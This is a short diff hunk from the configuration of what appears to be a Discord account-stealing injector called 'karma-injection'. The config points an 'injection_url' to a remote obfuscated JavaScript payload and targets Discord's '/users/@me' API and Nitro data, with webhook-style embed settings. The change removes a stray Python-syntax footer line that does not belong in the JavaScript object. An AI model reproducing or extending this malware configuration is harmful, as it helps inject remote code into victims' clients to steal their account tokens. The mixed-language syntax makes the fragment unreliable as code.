@@ -15,7 +15,6 @@ const config = {
   embed_icon: 'https://raw.githubusercontent.com/gzlaw/karma-injection/main/pfp/bin.png', 
   embed_color: 0, 
   injection_url: 'https://raw.githubusercontent.com/gzlaw/karma-injection/main/obfuscated.js', 
-  embed.set_footer(text="By: law | https://GitHub.com/gzlaw")
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
